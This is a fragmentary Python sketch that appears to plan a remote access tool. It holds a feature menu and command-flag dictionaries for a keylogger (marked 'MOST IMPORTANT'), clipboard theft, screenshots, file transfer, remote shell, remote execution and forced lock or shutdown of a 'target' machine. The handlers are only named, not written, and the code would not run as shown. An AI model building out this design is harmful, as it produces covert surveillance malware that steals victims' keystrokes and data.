menu = """
Shell
    back
    CD

Get Info --> Done
shutdown --> Via subprocess? 
    logoff 
    restart
    Lock

disconnect --> easy

Send File --> Client -> Server Done
Receive File --> Reverse above? 

Run Script --> NEEDS DOING

Send Console message
    send Messagebox

Keylogger --> MOST IMPORTANT
    Stop
    Start
    Retrieve Logs
Clipboard

Play a game
Attach a game
Run Front end Exe
Chat
"""

print(menu)
input()
"""

"""

dict = {
    "-Host": self.sendHostInfo,
    "-Msg": self.sendMsg,
    "-Fsend": self.filesend,
    "-RP": self.runprocess,
    "-RR": self.runrun,
    "-Telnet": self.enableTN,
    "-Chess": self.playchess,
    "-EpIV": self.playstarwars,
    "-Weather": self.weather,
    "-lock": self.locksystem,
    "-shutdown": self.shutdown,
    "-shutdownM": self.shutdownmessage,
    "-restart": self.restart,
    "-shell": self.fakeshell,
    "-loop": self.endless,
    ""

}
newdict= {
    "-msgbox": self.sendmsg,
    "-shutdown": self.shutdown,
    "-shutdownM" : self.shutdownmessage,
    "-lock": self.locksystem,
    "-restart": self.restartsystem,
    "-EpIV": self.playstarwars,
    "-chess": self.playchess,
    "-weather": self.weather,
    "-telnet": self.enableTN,
    "-KLstart": self.startKeyLogger,
    "-KLend": self.stopKeyLogger,
    "-getLogs": self.getKeyLogs,
    "-getcb": self.getClipBoard,
    "-Send": self.filesend,
    "-recv": self.filerecieve,
    "-ginfo": self.getTargetInfo,
    "-exe": self.exePy,
    "-ss": self.screenshot,
    "-vid": self.vidByFrames,
    "-shell": self.cmdctrl



}

